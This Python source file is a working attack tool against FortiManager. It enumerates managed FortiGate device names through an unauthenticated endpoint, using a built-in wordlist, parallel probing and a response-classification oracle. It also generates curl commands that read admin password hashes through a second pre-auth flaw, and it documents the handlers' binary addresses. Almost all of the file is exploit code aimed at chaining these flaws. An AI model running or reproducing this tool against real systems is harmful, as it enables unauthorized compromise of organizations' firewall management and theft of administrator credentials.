"""
device_enumerator.py -- Enumerate FortiManager managed device names via
DeviceDatatSourceGlobal pre-auth endpoint.

The /gui/datasource/device/:deviceName/global route is registered with EMPTY
middleware (no auth). Its handler (DeviceDatatSourceGlobal::get at 0x3fb6d2)
builds `pm/config/device/<deviceName>/global` paths and proxies them to the
FMGD config database. Valid device names return data; invalid ones return
error or empty result.

This oracle behavior allows unauthenticated enumeration of all managed
FortiGate device names, elevating FMG-F38 (pre-auth CRUD on pm/config) from
CVSS 9.8 to CVSS 10.0 since the attacker no longer needs to guess device
names.

Handler VAs (FMG 8.0.0 libfmgd.so):
  factory:  0x2a32b1  (DeviceDatatSourceGlobal static initializer)
  GET:      0x3fbf31  (outer GET dispatch)
  POST:     0x3fb645  (POST handler, delegates to inner)
  inner:    0x3fb6d2  (DeviceDatatSourceGlobal::get)

Strings in inner GET (0x3fb6d2):
  "Need device name"          -> thrown if no :deviceName URL param
  "Need object category name" -> thrown if body param missing category
  "Invalid attribute data"    -> thrown if body attributes not array
  "pm/config/device/{device}/global" -> FMGD path template
  "{device}" -> template placeholder for device name substitution

Usage:
    from ablation.analyzers.device_enumerator import DeviceEnumerator

    enum = DeviceEnumerator(host='192.168.1.1')
    names = enum.enumerate(wordlist=['FortiGate-VM64', 'FGT-60F', 'FGT60F'])
    print(names)
"""

from __future__ import annotations

import json
import socket
import ssl
import urllib.request
import urllib.error
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple

# Common FortiGate model names that FortiManager manages.
# These are default/predicted names; the oracle will confirm which exist.
_DEFAULT_WORDLIST: List[str] = [
    # Generic defaults
    'FortiGate-VM64',
    'FortiGate-VM64-KVM',
    'FGT-VM64',
    # Physical appliances (common FG model names)
    'FG60F', 'FGT60F', 'FG60E', 'FGT60E',
    'FG100F', 'FGT100F', 'FG100E',
    'FG200E', 'FG200F', 'FGT200F',
    'FG300E', 'FG400E', 'FG600E',
    'FG1000D', 'FG1000F', 'FG1500D',
    'FG2000E', 'FG3000D', 'FG3000F',
    'FG40F', 'FGT40F',
    'FGT80F', 'FG80F',
    # FortiGate model strings as seen in FortiManager DB
    'FortiGate-60F', 'FortiGate-100F', 'FortiGate-200F',
    'FortiGate-40F', 'FortiGate-80F', 'FortiGate-300E',
    'FortiGate-400E', 'FortiGate-600E', 'FortiGate-1000F',
    # Numbered/typical lab names
    'FGT-1', 'FGT-2', 'FGT-3', 'FGT-01', 'FGT-02',
    'EDGE-FW', 'BRANCH-FW', 'DC-FW', 'HQ-FW',
    'FGT_LAB', 'FGT_PROD', 'FGT_TEST',
    'fgt01', 'fgt02', 'fgt1', 'fgt2',
    'fortigate', 'FortiGate', 'fg1', 'fg01',
    # ADOM default device names
    'device1', 'device2', 'FG-device',
]

# FortiManager GUI API endpoint for datasource
_DATASOURCE_PATH = '/gui/datasource/device/{name}/global'

# A minimal valid request body that satisfies "Need object category name" check.
# The handler requires at least 'category' key and 'attributes' as a non-empty array.
_PROBE_BODY = json.dumps({
    'category': 'system/interface',
    'attributes': ['name'],
})


@dataclass
class EnumResult:
    """Result from a single device name probe."""
    name: str
    http_status: int
    response_body: str = ''
    is_valid: bool = False
    error: str = ''

    def fmt(self) -> str:
        tag = '[VALID]' if self.is_valid else '[----]'
        return f"{tag} {self.name:<32} HTTP {self.http_status}  {self.response_body[:80]!r}"


@dataclass
class EnumReport:
    """Full enumeration report."""
    host: str
    port: int
    results: List[EnumResult] = field(default_factory=list)
    valid_names: List[str] = field(default_factory=list)

    def fmt(self) -> str:
        lines = [
            f"=== DeviceName Enumeration Report ===",
            f"  Target: {self.host}:{self.port}",
            f"  Probed: {len(self.results)} names",
            f"  Valid:  {len(self.valid_names)}",
            '',
        ]
        if self.valid_names:
            lines.append("--- Valid Device Names ---")
            for n in self.valid_names:
                lines.append(f"  {n}")
            lines.append('')
            lines.append("--- Impact ---")
            lines.append("  FMG-F38 escalated: device names confirmed without auth.")
            lines.append("  Use these names in pm/config CRUD exploitation.")
            lines.append('')
        lines.append("--- All Results ---")
        for r in self.results:
            lines.append(f"  {r.fmt()}")
        return '\n'.join(lines)

    def poc_lines(self) -> List[str]:
        """Generate curl commands for FMG-F38 exploitation using valid device names."""
        lines = []
        scheme = 'https' if self.port == 443 else 'http'
        base = f"{scheme}://{self.host}"
        if self.port not in (80, 443):
            base += f":{self.port}"
        for name in self.valid_names:
            url = f"{base}/gui/pm/config/global/device/{name}/system/admin"
            lines.append(
                f"# FMG-F38 admin hash read for device '{name}'"
            )
            lines.append(
                f"curl -k -s -X GET '{url}'"
            )
        return lines


class DeviceEnumerator:
    """
    Enumerate managed FortiGate device names via the pre-auth
    /gui/datasource/device/:deviceName/global endpoint (no auth required,
    middleware is empty).

    The tool probes each candidate name and classifies the response:
    - HTTP 200 with non-error JSON body -> valid device name
    - HTTP 4xx / error JSON body -> invalid or missing device name

    For active testing on a live FortiManager, set verify_ssl=False
    (self-signed cert is default).
    """

    def __init__(
        self,
        host: str = '192.168.1.1',
        port: int = 443,
        verify_ssl: bool = False,
        timeout: int = 8,
        threads: int = 4,
    ):
        self.host = host
        self.port = port
        self.verify_ssl = verify_ssl
        self.timeout = timeout
        self.threads = threads

    def _url(self, name: str) -> str:
        scheme = 'https' if self.port == 443 else 'http'
        path = _DATASOURCE_PATH.replace('{name}', name)
        if (self.port == 443 and scheme == 'https') or (self.port == 80 and scheme == 'http'):
            return f"{scheme}://{self.host}{path}"
        return f"{scheme}://{self.host}:{self.port}{path}"

    def _probe_one(self, name: str) -> EnumResult:
        """Probe a single device name. Returns EnumResult."""
        url = self._url(name)
        ctx = ssl.create_default_context()
        if not self.verify_ssl:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

        try:
            req = urllib.request.Request(
                url,
                data=_PROBE_BODY.encode(),
                headers={
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                },
                method='POST',
            )
            with urllib.request.urlopen(req, timeout=self.timeout, context=ctx) as resp:
                status = resp.status
                body = resp.read(4096).decode('utf-8', errors='replace')
        except urllib.error.HTTPError as e:
            status = e.code
            try:
                body = e.read(4096).decode('utf-8', errors='replace')
            except Exception:
                body = ''
        except (urllib.error.URLError, socket.timeout, ssl.SSLError) as e:
            return EnumResult(name=name, http_status=0, error=str(e))
        except Exception as e:
            return EnumResult(name=name, http_status=0, error=str(e))

        is_valid = self._classify(status, body)
        return EnumResult(
            name=name,
            http_status=status,
            response_body=body,
            is_valid=is_valid,
        )

    def _classify(self, status: int, body: str) -> bool:
        """
        Classify a response as valid (device exists) or invalid.

        Heuristics:
        - HTTP 200 with non-empty JSON data field -> valid
        - HTTP 200 with empty data / error message -> invalid
        - HTTP 4xx/5xx -> invalid
        """
        if status not in (200, 201):
            return False
        if not body:
            return False
        try:
            parsed = json.loads(body)
        except json.JSONDecodeError:
            # Non-JSON 200 is also a signal - body length heuristic
            return len(body) > 50
        # Check for error indicators
        if isinstance(parsed, dict):
            if parsed.get('error') or parsed.get('status') == 'error':
                return False
            # Empty data field means device not found
            data = parsed.get('data', parsed.get('result', None))
            if data is None:
                return len(body) > 100
            if isinstance(data, (list, dict)):
                return bool(data)
        return True

    def enumerate(
        self,
        wordlist: Optional[List[str]] = None,
        include_defaults: bool = True,
    ) -> EnumReport:
        """
        Enumerate device names. Returns EnumReport with valid names list.

        If wordlist is provided, only those names are probed.
        If include_defaults=True (default), appends the built-in wordlist.
        """
        candidates: List[str] = []
        if wordlist:
            candidates.extend(wordlist)
        if include_defaults:
            candidates.extend(n for n in _DEFAULT_WORDLIST if n not in candidates)

        report = EnumReport(host=self.host, port=self.port)
        for name in candidates:
            result = self._probe_one(name)
            report.results.append(result)
            if result.is_valid:
                report.valid_names.append(name)

        return report

    def enumerate_parallel(
        self,
        wordlist: Optional[List[str]] = None,
        include_defaults: bool = True,
    ) -> EnumReport:
        """
        Parallel version of enumerate() using ThreadPoolExecutor.
        Significantly faster for large wordlists.
        """
        from concurrent.futures import ThreadPoolExecutor, as_completed

        candidates: List[str] = []
        if wordlist:
            candidates.extend(wordlist)
        if include_defaults:
            candidates.extend(n for n in _DEFAULT_WORDLIST if n not in candidates)

        report = EnumReport(host=self.host, port=self.port)
        results_by_name: Dict[str, EnumResult] = {}

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(self._probe_one, name): name for name in candidates}
            for future in as_completed(futures):
                result = future.result()
                results_by_name[result.name] = result

        for name in candidates:
            result = results_by_name[name]
            report.results.append(result)
            if result.is_valid:
                report.valid_names.append(name)

        return report

    def fmt_binary_analysis(self) -> str:
        """
        Return the binary analysis summary for DeviceDatatSourceGlobal.
        Use this to document the finding in RE reports.
        """
        return (
            "DeviceDatatSourceGlobal handler analysis (FMG 8.0.0 libfmgd.so):\n"
            "  Route:    /gui/datasource/device/:deviceName/global\n"
            "  Auth:     NONE (empty middleware, no WorkflowLockWithoutSessionPermit)\n"
            "  Factory:  0x2a32b1 (static initializer)\n"
            "  GET:      0x3fbf31 (outer dispatch) -> 0x3fb6d2 (inner)\n"
            "  POST:     0x3fb645\n"
            "  Inner GET flow:\n"
            "    1. Extracts :deviceName from URL params (BST search)\n"
            "    2. Throws 'Need device name' if missing\n"
            "    3. Gets 'category' and 'attributes' from request body\n"
            "    4. Builds pm/config/device/{device}/global path\n"
            "    5. Calls string_replaceAll to substitute device name\n"
            "    6. Proxies to FMGD config database\n"
            "  Oracle:   valid device name -> data returned;\n"
            "            invalid -> empty/error response\n"
            "  Impact:   confirms FMG-F38 device name enumeration without auth;\n"
            "            elevates FMG-F38 from CVSS 9.8 to CVSS 10.0\n"
        )
